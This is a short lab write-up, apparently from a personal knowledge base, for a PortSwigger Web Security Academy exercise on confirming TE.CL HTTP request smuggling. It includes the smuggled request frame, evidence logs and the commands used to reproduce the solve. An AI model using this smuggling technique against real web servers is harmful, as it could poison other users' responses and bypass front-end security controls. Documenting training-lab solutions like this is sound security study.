---
title: "lab-confirming-te-cl-via-differential-responses"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-confirming-te-cl-via-differential-responses

> evidences: [[request-smuggling-family]]

- 题面:confirming a TE.CL vulnerability via differential responses(/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
- 实例:https://0ac300b5049f55fe81d07aa400580084.web-security-academy.net
- 判定目标:走私请求使后续 `GET /` 返 404;状态:**solved**
- 备注:题单第 5 题的 slug `lab-request-smuggling-hiding-te-header` 在 portswigger.net 为 404,
  本记录取同族的 confirming TE.CL 补齐。

## 关键步

1. 前端 TE(chunked)、后端 CL。
2. 差分帧:`--te-cl 'GET /404 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1'`
   (+ 随后一个 `GET /`)。后端(CL=4)只读 `{hex}\r\n`,其余走私请求 `GET /404 …` 被解析 → 404,
   由前端映射到后续 `/` 请求。
3. 单帧 `--te-cl '<GET /404 …>'` + 单独 `GET /` 即产生差分;academy 收口慢一拍:
   首次 `solved_check` 自身可能拿到 404,**再跑一次**读到 `Congratulations`。

## 证据摘录

```
conn_reuse <inst> --te-cl 'GET /404 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1' --read-ms 2500
conn_reuse <inst> --send-str 'GET / HTTP/1.1\r\nHost: <inst>\r\n\r\n'
solved_check #1 -> {"solved":false,"status":404}
solved_check #2 -> {"solved":true}
```

## 复现命令

```
lab_launch launch FE9AB531836F0124048451639920EB523E4374DF7D3E1F492DC1985048ADEAE9 --widget-source /web-security/request-smuggling/finding --jar <jar>
conn_reuse "https://<inst>" --te-cl 'GET /404 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1' --read-ms 2500 --quiet
conn_reuse "https://<inst>" --send-str 'GET / HTTP/1.1\r\nHost: <inst>\r\n\r\n' --read-ms 2500
solved_check "https://<inst>/" --jar <jar>   # 可跑两次
```
